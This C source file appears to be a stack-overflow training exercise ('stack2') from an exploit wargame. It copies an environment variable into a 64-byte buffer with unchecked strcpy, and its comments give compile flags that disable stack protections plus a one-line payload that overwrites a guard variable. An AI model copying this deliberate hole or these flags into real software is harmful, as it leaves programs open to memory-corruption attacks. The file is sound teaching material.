#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// gcc -static -z execstack -z norelro -fno-stack-protector -o stack2 stack2.c -m32 -g
// export GREENIE=$(python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")') && ./stack2

int main(int argc, char **argv)
{
	volatile int modified;
	char buffer[64];
	char *variable;

	variable = getenv("GREENIE");

	if (variable == NULL)
		errx(1, "please set the GREENIE environment variable\n");

	modified = 0;

	strcpy(buffer, variable);

	if (modified == 0x0d0a0d0a)
		printf("you have correctly modified the variable\n");
	else
		printf("Try again, you got 0x%08x\n", modified);
}
